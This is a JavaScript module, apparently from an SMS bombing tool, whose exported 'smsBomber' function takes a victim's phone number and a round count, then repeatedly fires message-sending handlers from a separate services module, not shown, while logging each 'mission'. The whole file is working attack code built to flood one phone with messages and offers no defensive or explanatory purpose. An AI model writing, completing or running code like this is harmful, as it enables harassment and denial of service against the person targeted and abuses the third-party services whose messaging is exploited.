const { initializeServices, getServiceStats } = require('../services');
const { logMissionStart, logMissionComplete, logError } = require('../utils/logger');

const ROUND_DELAY_MS = 1000;
const FINISH_TIMEOUT_MS = 5000;

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function smsBomber(phone, amount, delaySeconds = 0, onLog = null) {
    const delayMs = delaySeconds * 1000;
    const targetAmount = parseInt(amount, 10);
    
    const stats = {
        startDate: Date.now(),
        phone,
        amount: targetAmount,
        delay: delaySeconds,
        total: 0,
        success: 0,
        error: 0,
        finished: false
    };
    
    let isFinished = false;
    let finishResolver = null;
    
    const finishPromise = new Promise(resolve => {
        finishResolver = resolve;
    });
    
    function finish() {
        if (isFinished) return;
        isFinished = true;
        stats.finished = true;
        
        if (!onLog) {
            logMissionComplete(stats);
        }
        
        finishResolver({
            status: true,
            dataSb: stats,
            stats: {
                total: stats.total,
                success: stats.success,
                error: stats.error,
                duration: Date.now() - stats.startDate
            }
        });
    }
    
    if (!onLog) {
        logMissionStart(phone, targetAmount, delaySeconds);
    }

    try {
        const serviceHandlers = initializeServices(onLog);
        
        async function sendRound(phoneNumber) {
            for (const service of serviceHandlers) {
                if (isFinished) break;
                service.handler(phoneNumber, stats, finish);
                if (delayMs > 0) {
                    await delay(delayMs);
                }
            }
        }
        
        for (let i = 0; i < targetAmount; i++) {
            if (isFinished) break;
            
            await sendRound(phone);
            
            if (i < targetAmount - 1 && !isFinished) {
                await delay(ROUND_DELAY_MS);
            }
        }
        
        const timeoutId = setTimeout(() => {
            if (!isFinished) {
                finish();
            }
        }, FINISH_TIMEOUT_MS);
        
        const result = await finishPromise;
        clearTimeout(timeoutId);
        
        return result;
        
    } catch (error) {
        if (!onLog) {
            logError(error);
        }
        return { 
            status: false, 
            message: error.message || 'Critical system error occurred.' 
        };
    }
}

module.exports = smsBomber;
module.exports.getServiceStats = getServiceStats;
